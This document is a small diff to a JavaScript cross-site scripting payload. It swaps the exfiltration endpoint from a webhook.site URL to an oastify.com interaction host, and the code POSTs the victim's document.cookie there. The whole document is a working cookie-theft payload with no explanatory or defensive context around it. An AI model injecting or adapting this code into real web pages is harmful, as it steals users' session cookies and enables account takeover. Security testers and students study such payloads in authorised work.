@@ -1,4 +1,4 @@
-fetch("https://webhook.site/91ae6f9a-ba27-4b42-8717-7acc927c74d7/?c='+document.cookie'", {
+fetch("http://5gmxqa0p43eq7ulqsywotcet9kfb31rq.oastify.com", {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
